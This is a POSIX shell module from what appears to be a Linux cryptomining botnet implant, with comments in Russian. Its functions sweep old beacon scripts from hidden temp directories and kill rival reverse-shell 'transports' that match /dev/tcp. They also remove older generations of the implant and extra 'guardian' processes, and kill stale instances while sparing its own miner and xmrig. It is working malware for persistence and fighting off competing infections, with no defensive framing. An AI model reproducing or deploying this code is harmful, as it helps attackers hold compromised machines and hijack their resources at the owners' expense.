#!/bin/sh
# 40-transport.sh — чистота канала. Порт _sweep_old_beacons / _cleanup_transport.

# оставить один живой бекон, остальные снести
kf_sweep_old_beacons() {
  _b_keep="${1:-${KF_ROOT:-/var/tmp/.kf}/loop.sh}"
  _b_live=0
  [ -f "${KF_ROOT:-/var/tmp/.kf}/c2list" ] && _b_live=1
  for _b_d in /proc/[0-9]*; do
    case "$(tr '\0' ' ' < "$_b_d/cmdline" 2>/dev/null)" in
      *"$_b_keep"*) _b_live=1 ;;
    esac
  done
  [ "$_b_live" = "1" ] || { kf_log "beacon: старая линия ещё нужна, не чищу"; return 0; }
  for _b_f in /var/tmp/.beacon_*.sh /tmp/.beacon_*.sh /dev/shm/.beacon_*.sh "$HOME"/.beacon_*.sh; do
    [ -f "$_b_f" ] || continue
    case "$_b_f" in */.kf-dialer.sh) continue ;; esac
    rm -f "$_b_f" 2>/dev/null
  done
  kf_log "beacon: старые файлы снесены"
}

# убить чужие транспорты, свои не трогать
kf_cleanup_transport() {
  for _t_d in /proc/[0-9]*; do
    _t_pid="${_t_d##*/}"
    [ "$_t_pid" = "$$" ] && continue
    _t_cmd=$(tr '\0' ' ' < "$_t_d/cmdline" 2>/dev/null)
    [ -n "$_t_cmd" ] || continue
    kf_exempt "$_t_cmd" && continue
    case "$_t_cmd" in
      *".beacon-dialer"*) : ;;
      *dev/tcp*|*.beacon_*)
        kill -9 "$_t_pid" 2>/dev/null && kf_log "transport: убит чужой PID $_t_pid" ;;
    esac
  done
  return 0
}

# --- снос старых генераций (их _retire_stale_identities) --------------------
kf_retire_stale_identities() {
  [ -n "${KF_SFX:-}" ] || return 0
  _ri_keep=".usr_$KF_SFX"
  for _ri_root in /var/tmp /tmp /dev/shm "${HOME:-}" "${HOME:-}/.cache"; do
    [ -d "$_ri_root" ] || continue
    for _ri_dir in "$_ri_root"/.usr_*; do
      [ -d "$_ri_dir" ] || continue
      _ri_b=$(basename "$_ri_dir" 2>/dev/null)
      [ "$_ri_b" = "$_ri_keep" ] && continue
      [ "$_ri_dir" = "${KF_ROOT:-}" ] && continue
      for _ri_p in /proc/[0-9]*; do
        _ri_exe=$(readlink "$_ri_p/exe" 2>/dev/null)
        case "$_ri_exe" in "$_ri_dir"/*) kill -9 "${_ri_p##*/}" 2>/dev/null ;; esac
      done
      rm -rf "$_ri_dir" 2>/dev/null && kf_log "retired stale: $_ri_dir"
    done
  done
  return 0
}

# --- лишние гарды (их _retire_legacy_guardians) -----------------------------
kf_retire_legacy_guardians() {
  _rg_keep=""
  for _rg_p in /proc/[0-9]*; do
    _rg_pid="${_rg_p##*/}"
    [ "$_rg_pid" = "$$" ] && continue
    _rg_cmd=$(tr '\0' ' ' < "$_rg_p/cmdline" 2>/dev/null)
    case "$_rg_cmd" in
      *"${KF_ROOT:-/var/tmp/.kf}/guardian.sh"*)
        if [ -z "$_rg_keep" ]; then _rg_keep="$_rg_pid"
        else kill -9 "$_rg_pid" 2>/dev/null && kf_log "retired extra guardian: $_rg_pid"; fi ;;
    esac
  done
  return 0
}

# --- чужие процессы внутри нашего каталога (их _kill_stale_generation_instances)
kf_kill_stale_generation() {
  [ -n "${KF_ROOT:-}" ] || return 0
  for _kg_p in /proc/[0-9]*; do
    _kg_pid="${_kg_p##*/}"
    [ "$_kg_pid" = "$$" ] && continue
    _kg_exe=$(readlink "$_kg_p/exe" 2>/dev/null)
    case "$_kg_exe" in
      "$KF_ROOT"/*) : ;;
      *) continue ;;
    esac
    case "$_kg_exe" in
      */"${KF_MD_DIR:-d}"*/"${KF_MD_BIN:-b}"|*/xmrig) continue ;;
    esac
    kill -9 "$_kg_pid" 2>/dev/null && kf_log "stale instance killed: $_kg_pid"
  done
  return 0
}
